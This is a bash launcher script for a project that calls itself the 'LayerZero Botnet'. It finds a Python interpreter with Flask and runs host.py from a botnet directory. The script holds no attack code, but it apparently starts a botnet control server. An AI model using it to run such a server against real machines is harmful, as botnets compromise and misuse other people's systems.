#!/usr/bin/env bash
# ============================================================
# LayerZero Botnet — Host Launcher
# Automatically finds a Python with Flask installed and runs.
# Usage: ./run_host.sh [host.py flags...]
# ============================================================

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BOT_DIR="$SCRIPT_DIR/botnet"

# --- Find a Python that has Flask ---
PYTHON=""
for candidate in python3 python /opt/anaconda3/bin/python3 /opt/homebrew/bin/python3 \
                 "$HOME/anaconda3/bin/python3" "$HOME/miniconda3/bin/python3" \
                 "$HOME/.pyenv/shims/python3"; do
    if command -v "$candidate" &>/dev/null; then
        if "$candidate" -c "import flask" 2>/dev/null; then
            PYTHON="$candidate"
            break
        fi
    fi
done

if [ -z "$PYTHON" ]; then
    echo ""
    echo "  [!] Flask not found in any Python on this system."
    echo "  [!] Install it with one of:"
    echo ""
    echo "        pip install flask"
    echo "        pip3 install flask"
    echo "        conda install flask"
    echo ""
    echo "  Then re-run this script."
    echo ""
    exit 1
fi

PYVER=$("$PYTHON" --version 2>&1)
echo "[+] Using Python: $PYTHON ($PYVER)"
echo "[+] Starting host..."
echo ""
cd "$BOT_DIR" || exit 1
exec "$PYTHON" host.py "$@"
